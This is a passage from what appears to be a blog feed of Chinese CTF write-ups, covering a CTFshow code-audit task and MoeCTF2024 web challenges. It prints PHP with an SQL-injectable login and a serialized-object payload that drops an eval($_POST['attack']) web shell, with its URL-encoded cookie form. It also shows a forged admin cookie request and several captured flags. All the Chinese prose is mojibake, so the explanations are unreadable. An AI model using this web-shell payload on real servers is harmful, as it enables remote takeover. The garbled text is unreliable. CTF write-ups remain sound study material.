punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$userpwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select sds_password from sds_user where sds_username='"</span><span class="token operator">.</span><span class="token variable">$username</span><span class="token operator">.</span><span class="token string double-quoted-string">"' order by id limit 1;"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token constant">MYSQLI_BOTH</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token operator">&lt;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcasecmp</span><span class="token punctuation">(</span><span class="token function">sds_decode</span><span class="token punctuation">(</span><span class="token variable">$userpwd</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sds_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>Áõ¥Êé•ÊûÑÈÄ†ÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">user</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">user</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;?php eval(\$_POST['attack']);?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>Âõ†‰∏∫cookie‰∏≠Â∞Ü‚Äù‰Ωú‰∏∫Êà™Êñ≠Á¨¶Âè∑ÔºåÊâÄÈúÄË¶ÅÁºñÁ†ÅÁªïËøáÔºåËøôÈáåÈááÁî®urlÁºñÁ†Å</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>user<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>a<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A31<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">3</span>Fphp<span class="token operator">+</span><span class="token keyword">eval</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">24</span>_POST<span class="token operator">%</span><span class="token number">5</span>B<span class="token operator">%</span><span class="token number">27</span>attack<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">5</span>D<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">3</span>F<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D</code></pre><p>ÁÑ∂ÂêéÁî®ËöÅÂâëËøûÊé•ÔºåÂõ†‰∏∫Ë¥¶Âè∑ÂØÜÁ†ÅÂ∑≤ÁªèÁªô‰∫ÜÔºåÊâÄ‰ª•Áõ¥Êé•ËøûÊé•Êï∞ÊçÆÂ∫ìÂ∞±Ë°å(Ê≥®ÊÑèÊú¨Âú∞‰∏ãËΩΩÁöÑsqlÂØÜÁ†ÅÂíåÁúüÊ≠£ÁöÑ‰∏ç‰∏ÄÊ†∑)</p>]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> ‰ª£Á†ÅÂÆ°ËÆ° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MoeCTF2024-web</title>
      <link href="/2024/08/10/MoeCTF2024-web/"/>
      <url>/2024/08/10/MoeCTF2024-web/</url>
      
        <content type="html"><![CDATA[<h4 id="ProveYourLove"><a href="#ProveYourLove" class="headerlink" title="ProveYourLove"></a>ProveYourLove</h4><p><img src="ProveYourLove.png" loading="lazy"></p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML"># Ê∫êÁ†Å&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Ë°®ÁôΩÂ¢ô&lt;&#x2F;title&gt;    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;    &lt;style&gt;        body &#123;            font-family: Arial, sans-serif;            margin: 20px;            padding: 0;            background-image: url(&#39;static&#x2F;image.jpg&#39;);            background-size: cover;            background-repeat: no-repeat;            background-position: center center;            color: #fff;        &#125;        .container &#123;            max-width: 600px;            margin: 0 auto;            background: rgba(0, 0, 0, 0.6); &#x2F;* ÂçäÈÄèÊòéËÉåÊôØ *&#x2F;            padding: 20px;            border-radius: 8px;        &#125;        h1 &#123;            text-align: center;            margin-top: 0;        &#125;        form &#123;            margin-bottom: 20px;        &#125;        label &#123;            display: block;            margin-top: 10px;        &#125;        input[type&#x3D;&quot;text&quot;], textarea, select &#123;            width: calc(100% - 16px); &#x2F;* Áªü‰∏ÄÂÆΩÂ∫¶ÔºåÂáèÂéªÂÜÖËæπË∑ù *&#x2F;            padding: 8px;            margin-top: 5px;            border-radius: 4px;            border: 1px solid #ddd;            background-color: rgba(255, 255, 255, 0.2); &#x2F;* ÂçäÈÄèÊòéËÉåÊôØ *&#x2F;            color: #fff;            box-sizing: border-box; &#x2F;* Á°Æ‰øùÂÆΩÂ∫¶ÂåÖÊã¨ÂÜÖËæπË∑ùÂíåËæπÊ°Ü *&#x2F;        &#125;        textarea &#123;            width: calc(100% - 16px); &#x2F;* Á°Æ‰øùÊñáÊú¨Âå∫ÂüüÂÆΩÂ∫¶‰∏ÄËá¥ *&#x2F;        &#125;        input[type&#x3D;&quot;submit&quot;] &#123;            margin-top: 10px;            padding: 10px 20px;            font-size: 16px;            background-color: #4CAF50;            color: white;            border: none;            border-radius: 4px;            cursor: pointer;        &#125;        input[type&#x3D;&quot;submit&quot;]:hover &#123;            background-color: #45a049;        &#125;        .status &#123;            margin-top: 20px;            text-align: center;            font-size: 18px;        &#125;    &lt;&#x2F;style&gt;&lt;&#x2F;head&gt;&lt;body&gt;    &lt;div class&#x3D;&quot;container&quot;&gt;        &lt;h1&gt;Ë°®ÁôΩÂ¢ô&lt;&#x2F;h1&gt;        &lt;form id&#x3D;&quot;confessionForm&quot;&gt;            &lt;label for&#x3D;&quot;nickname&quot;&gt;ÊòµÁß∞:&lt;&#x2F;label&gt;            &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;nickname&quot; name&#x3D;&quot;nickname&quot; required placeholder&#x3D;&quot;ËæìÂÖ•ÊÇ®ÁöÑÊòµÁß∞&quot;&gt;            &lt;label for&#x3D;&quot;user_gender&quot;&gt;ÊÇ®ÁöÑÊÄßÂà´:&lt;&#x2F;label&gt;            &lt;select id&#x3D;&quot;user_gender&quot; name&#x3D;&quot;user_gender&quot; required&gt;                &lt;option value&#x3D;&quot;male&quot;&gt;Áî∑&lt;&#x2F;option&gt;                &lt;option value&#x3D;&quot;female&quot;&gt;Â•≥&lt;&#x2F;option&gt;                &lt;option value&#x3D;&quot;other&quot;&gt;ÂÖ∂‰ªñ&lt;&#x2F;option&gt;            &lt;&#x2F;select&gt;            &lt;label for&#x3D;&quot;target&quot;&gt;Ë°®ÁôΩÂØπË±°:&lt;&#x2F;label&gt;            &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;target&quot; name&#x3D;&quot;target&quot; required placeholder&#x3D;&quot;ËæìÂÖ•ÊÇ®Ë°®ÁôΩÁöÑÂØπË±°&quot;&gt;            &lt;label for&#x3D;&quot;target_gender&quot;&gt;Ë°®ÁôΩÂØπË±°ÁöÑÊÄßÂà´:&lt;&#x2F;label&gt;            &lt;select id&#x3D;&quot;target_gender&quot; name&#x3D;&quot;target_gender&quot; required&gt;                &lt;option value&#x3D;&quot;male&quot;&gt;Áî∑&lt;&#x2F;option&gt;                &lt;option value&#x3D;&quot;female&quot;&gt;Â•≥&lt;&#x2F;option&gt;                &lt;option value&#x3D;&quot;other&quot;&gt;ÂÖ∂‰ªñ&lt;&#x2F;option&gt;            &lt;&#x2F;select&gt;            &lt;label for&#x3D;&quot;message&quot;&gt;Ë°®ÁôΩÂÜÖÂÆπ:&lt;&#x2F;label&gt;            &lt;textarea id&#x3D;&quot;message&quot; name&#x3D;&quot;message&quot; rows&#x3D;&quot;6&quot; required placeholder&#x3D;&quot;ËæìÂÖ•ÊÇ®ÁöÑË°®ÁôΩÂÜÖÂÆπ&quot;&gt;&lt;&#x2F;textarea&gt;            &lt;label for&#x3D;&quot;anonymous&quot;&gt;ÊòØÂê¶ÂåøÂêç:&lt;&#x2F;label&gt;            &lt;select id&#x3D;&quot;anonymous&quot; name&#x3D;&quot;anonymous&quot; required&gt;                &lt;option value&#x3D;&quot;false&quot;&gt;‰∏çÂåøÂêç&lt;&#x2F;option&gt;                &lt;option value&#x3D;&quot;true&quot;&gt;ÂåøÂêç&lt;&#x2F;option&gt;            &lt;&#x2F;select&gt;            &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Êèê‰∫§Ë°®ÁôΩ&quot;&gt;        &lt;&#x2F;form&gt;        &lt;div class&#x3D;&quot;status&quot;&gt;            ÂΩìÂâçË°®ÁôΩ‰ªΩÊï∞: &lt;span id&#x3D;&quot;confessionCount&quot;&gt;Âä†ËΩΩ‰∏≠...&lt;&#x2F;span&gt;&lt;br&gt;            flag: &lt;span id&#x3D;&quot;flag&quot;&gt;ËÆøÈóÆconfession_countËé∑Âèñ&lt;&#x2F;span&gt;&lt;br&gt;            Qixi_flag: &lt;span id&#x3D;&quot;Qixi_flag&quot;&gt;ËÆøÈóÆquestionnaire_countËé∑Âèñ&lt;&#x2F;span&gt;        &lt;&#x2F;div&gt;    &lt;&#x2F;div&gt;    &lt;script&gt;        document.addEventListener(&#39;DOMContentLoaded&#39;, function() &#123;            &#x2F;&#x2F; Ëé∑ÂèñÂΩìÂâçË°®ÁôΩ‰ªΩÊï∞            fetch(&#39;&#x2F;confession_count&#39;)                .then(response &#x3D;&gt; response.json())                .then(data &#x3D;&gt; &#123;                    document.getElementById(&#39;confessionCount&#39;).textContent &#x3D; data.count;                    document.getElementById(&#39;flag&#39;).textContent &#x3D; data.flag;                    document.getElementById(&#39;Qixi_flag&#39;).textContent &#x3D; data.Qixi_flag;                &#125;)                .catch(error &#x3D;&gt; &#123;                    console.error(&#39;Error:&#39;, error);                &#125;);        &#125;);        document.getElementById(&#39;confessionForm&#39;).addEventListener(&#39;submit&#39;, function(event) &#123;            event.preventDefault(); &#x2F;&#x2F; ÈòªÊ≠¢Ë°®ÂçïÁöÑÈªòËÆ§Êèê‰∫§Ë°å‰∏∫            &#x2F;&#x2F; Ê£ÄÊü•ËÆæÂ§áÊòØÂê¶Â∑≤Êèê‰∫§ËøáË°®ÁôΩ            if (localStorage.getItem(&#39;confessionSubmitted&#39;)) &#123;                alert(&#39;ÊÇ®Â∑≤ÁªèÊèê‰∫§ËøáË°®ÁôΩÔºå‰∏çËÉΩÈáçÂ§çÊèê‰∫§„ÄÇ&#39;);                return;            &#125;            &#x2F;&#x2F; ÂèëËµ∑ OPTIONS ËØ∑Ê±Ç            fetch(&#39;&#x2F;questionnaire&#39;, &#123;                method: &#39;OPTIONS&#39;            &#125;)            .then(response &#x3D;&gt; &#123;                if (!response.ok) &#123;                    throw new Error(&#39;OPTIONS ËØ∑Ê±ÇÂ§±Ë¥•&#39;);                &#125;                &#x2F;&#x2F; Ëé∑ÂèñË°®ÂçïÊï∞ÊçÆ                const formData &#x3D; new FormData(event.target);                const data &#x3D; &#123;&#125;;                formData.forEach((value, key) &#x3D;&gt; &#123;                    data[key] &#x3D; value;                &#125;);                &#x2F;&#x2F; Êèê‰∫§Ë°®ÁôΩÊï∞ÊçÆ                return fetch(&#39;&#x2F;questionnaire&#39;, &#123;                    method: &#39;POST&#39;,                    headers: &#123;                        &#39;Content-Type&#39;: &#39;application&#x2F;json&#39;                    &#125;,                    body: JSON.stringify(data)                &#125;);            &#125;)            .then(response &#x3D;&gt; response.json())            .then(result &#x3D;&gt; &#123;                if (result.success) &#123;                    alert(&#39;Ë°®ÁôΩÊèê‰∫§ÊàêÂäüÔºÅ&#39;);                    localStorage.setItem(&#39;confessionSubmitted&#39;, &#39;true&#39;);                    &#x2F;&#x2F; Êõ¥Êñ∞Ë°®ÁôΩ‰ªΩÊï∞                    fetch(&#39;&#x2F;confession_count&#39;)                        .then(response &#x3D;&gt; response.json())                        .then(data &#x3D;&gt; &#123;                            document.getElementById(&#39;confessionCount&#39;).textContent &#x3D; data.count;                            document.getElementById(&#39;flag&#39;).textContent &#x3D; data.flag;                            document.getElementById(&#39;Qixi_flag&#39;).textContent &#x3D; data.Qixi_flag;                        &#125;)                        .catch(error &#x3D;&gt; &#123;                            console.error(&#39;Error:&#39;, error);                        &#125;);                &#125; else &#123;                    alert(&#39;Ë°®ÁôΩÊèê‰∫§Â§±Ë¥•ÔºåËØ∑Á®çÂêéÈáçËØï„ÄÇ&#39;);                &#125;            &#125;)            .catch(error &#x3D;&gt; &#123;                console.error(&#39;Error:&#39;, error);            &#125;);        &#125;);    &lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>È¢òÁõÆÁªô‰∫ÜHintÔºåÂøÖÈ°ªÂèëÈÄÅ300Ê¨°ÊâçÂèØ‰ª•ÂæóÂà∞flag</p><p>ÈóÆÈ¢òÂú®‰∫éÔºåÊØèÊ¨°ÂèëÈÄÅÂêé‰ºöÂú®Êú¨Âú∞ÂÇ®Â≠ò<code>confessionSubmitted=true</code>ËøôÊ†∑ÁöÑËØùÁ¨¨‰∫åÊ¨°ÂÇ®Â≠òÂ∞±‰ºö‰∏çÂÖÅËÆ∏ÂèëÈÄÅ</p><p>‰∫éÊòØÂè™Ë¶ÅÂú®ÂèëËµ∑ËØ∑Ê±ÇÁöÑÊó∂ÂÄôÂä†‰∏ä <code>Cache-Control: no-store</code>Êù•ÈòªÊ≠¢ËøõË°åÊú¨Âú∞ÂÇ®Â≠òÔºå‰ΩøÁî®burpÂèëÈÄÅ300ÈÅçÂç≥ÂèØÂæóÂà∞flag</p><pre class="language-markup" data-language="markup"><code class="language-markup">ÂΩìÂâçË°®ÁôΩ‰ªΩÊï∞: 329flag: moectf&#123;c0NgRaTuL@tioNs-ON-6EC0M1Ng-4-Lick1NG_dOG48&#125;Qixi_flag: moeCTF&#123;Happy_Chin3s3_Va13ntin3's_Day,_Baby.&#125;</code></pre><h4 id="ÂºóÊãâÊ†º‰πãÂú∞ÁöÑÊåëÊàò"><a href="#ÂºóÊãâÊ†º‰πãÂú∞ÁöÑÊåëÊàò" class="headerlink" title="ÂºóÊãâÊ†º‰πãÂú∞ÁöÑÊåëÊàò"></a>ÂºóÊãâÊ†º‰πãÂú∞ÁöÑÊåëÊàò</h4><p> <strong>web ‰∏ÉÈæôÁè†</strong></p><p>Ê¨¢ËøéÊù•Âà∞ÂºóÊãâÊ†º‰πãÂú∞ËøõË°å web ‰∏ÉÈæôÁè†ËØïÁÇº</p><p>Âú®ËøôÈáåÔºå‰Ω†Â∞ÜÊ†πÊçÆÂºïÂØºÔºåÂÆåÊàêÊï∞‰∏™‰ªªÂä°Ôºå‰ªéËÄåËé∑ÂæóÂêç‰∏∫ flag ÁöÑ‰∏úË•ø</p><p>Êú¨Ê¨°Êàë‰ª¨ÈááÁî®‰∏Ä‰∏™Âè´ÂÅöÂàÜÊÆµ flag ÁöÑ‰∏úË•øÔºåÂ∞Ü flag ÂàÜ‰∏∫‰∏ÉÈ¢óÈæôÁè†ÔºåÈõÜÈΩê‰∏ÉÈ¢óÈæôÁè†Â∞±ÂèØ‰ª•Ëé∑ÂæóÊúÄÁªàÁöÑ flag</p><p>Âú®ËøôÊ¨°ÊåëÊàò‰∏≠ÔºåËØ∑ÈöèÊó∂ÂáÜÂ§áÂ•Ω‰Ω†ÁöÑËÆ∞‰∫ãÊú¨Âì¶</p><p>Áé∞Âú®Êàë‰ª¨ÂºÄÂßãÔºåÊèêÁ§∫Âú®‰∏ãÈù¢ ‚Üì</p><p>&#x2F;flag1ab.html</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>flag1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Ëá≥Â∞ë‰Ω†‰ºöË∑≥ËΩ¨ url (bushi<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Áé∞Âú®ÊòØÁ¨¨‰∏ÄÈÅìÈ¢òÔºåÊàë‰ª¨Â≠¶‰π†ÁöÑÊòØÔºö html <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>ËøôË°åÂ≠óÁöÑ‰∏ãÈù¢‰∏ÄÁâáÁ©∫ÁôΩÔºå‰ΩÜÊòØÁúüÁöÑ‰ªÄ‰πà‰πüÊ≤°ÊúâÂêóÔºü<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--ÊÅ≠Âñú‰Ω†ÊâæÂà∞‰∫ÜÁΩëÈ°µÁöÑÊ∫ê‰ª£Á†ÅÔºåÈÄöÂ∏∏Âú®ËøôÈáåÈ¢òÁõÆ‰ºöÊîæ‰∏Ä‰∫õÊèêÁ§∫ÔºåÂÅöÈ¢òÊ≤°Â§¥Áª™‰∏ÄÂÆöË¶ÅÂÖàËøõÊù•Áúã‰∏Ä‰∏ã--></span><span class="token comment">&lt;!--flag1: bW9lY3Rm--></span><span class="token comment">&lt;!--‰∏ã‰∏ÄÊ≠•Ôºö/flag2hh.php--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>ÊÅ≠Âñú‰Ω†Â∑≤ÁªèÂ≠¶‰ºö‰∫ÜÂ¶Ç‰ΩïÊü•ÁúãÁΩëÈ°µÊ∫ê‰ª£Á†ÅÔºå‰ΩÜËøôËøò‰∏çÂ§ü</p><p>ËøôÊòØÁ¨¨‰∫åÈ¢òÔºåÊú¨È¢òÂÖ≥ÈîÆËØçÔºö http </p><p>ÊÉ≥ÊÉ≥ÊúçÂä°Âô®ÈÄöËøáÁΩëÁªú‰º†ËæìËøáÊù•ÁöÑÔºåÈô§‰∫ÜËøô‰∏™È°µÈù¢ÔºåËøòÊúâ‰ªÄ‰πàÔºü</p><pre class="language-http" data-language="http"><code class="language-http"># ÊäìÂåÖ<span class="token header"><span class="token header-name keyword">flag2</span><span class="token punctuation">:</span> <span class="token header-value">e0FmdEV</span></span><span class="token header"><span class="token header-name keyword">nextpage</span><span class="token punctuation">:</span> <span class="token header-value">/flag3cad.php</span></span></code></pre><p>ÊàëÊÉ≥Ôºå‰Ω†Â∫îËØ•Â∑≤ÁªèÁü•ÈÅì devtools Ëøô‰∏™‰∏úË•ø‰∫Ü„ÄÇ(‰∏çÁü•ÈÅì‰πüÊ≤°ÂÖ≥Á≥ªÔºå‰Ω† f12 Âá∫Êù•ÁöÑÂ∞±ÊòØ devtools)</p><p>ÈÇ£‰πàÁé∞Âú®Âú®‰Ω†Èù¢ÂâçÁöÑÊúâ‰∏§‰∏™ÊïôÁ®ãÔºö</p><p>\1. Â∞ùËØïÊää devtools ËøêÁî®ÁÜüÁªÉ</p><p>\2. Â∞ùËØï‰∏ãËΩΩ‰∏Ä‰∏™Âà´ÁöÑ‰ªÄ‰πàÁé©ÊÑèÊù•‰ΩøÁî®</p><p>ËøôÈ¢òÔºåÊàë‰ª¨ËøòÊòØÂ≠¶‰π† http</p><p>ÈÇ£‰πàÔºåÊàë‰ª¨Êù•ËØï‰∏Ä‰∏ãÂêåÊó∂Êää‰∏ãÈù¢Ë¶ÅÊ±ÇÂÆåÊàêÂêßÔºÅ</p><p>-‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äì</p><p>ËØ∑Áî® GET ÊñπÊ≥ï‰º†ÂÖ•‰∏Ä‰∏™ a ÂèÇÊï∞<br>ÂÜçÁî® POST ÊñπÊ≥ï‰º†ÂÖ•‰∏Ä‰∏™ b ÂèÇÊï∞<br>‰Ω†ÈúÄË¶Å‰ΩøÁî® admin ÁöÑË∫´‰ªΩÈ™åËØÅ</p><pre class="language-markup" data-language="markup"><code class="language-markup">ÊÅ≠Âñú‰Ω†Â∑≤ÁªèÂü∫Êú¨ÊéåÊè°‰∫Ü http ÁöÑÊúÄÊúÄÊúÄÂü∫Á°ÄÁü•ËØÜÔºåÂÖàÂéª‰∏ã‰∏ÄÂÖ≥Âêßflag3: yX3RoMXN</code></pre><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/flag3cad.php?a=1</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:8846</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">DNT</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">verify=admin</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">3</span></span>b=1</code></pre><p>ËôΩÁÑ∂‰ΩÜÊòØÔºåÂìçÂ∫îÂ§¥Êúâ‰∏™<code>fxxk: 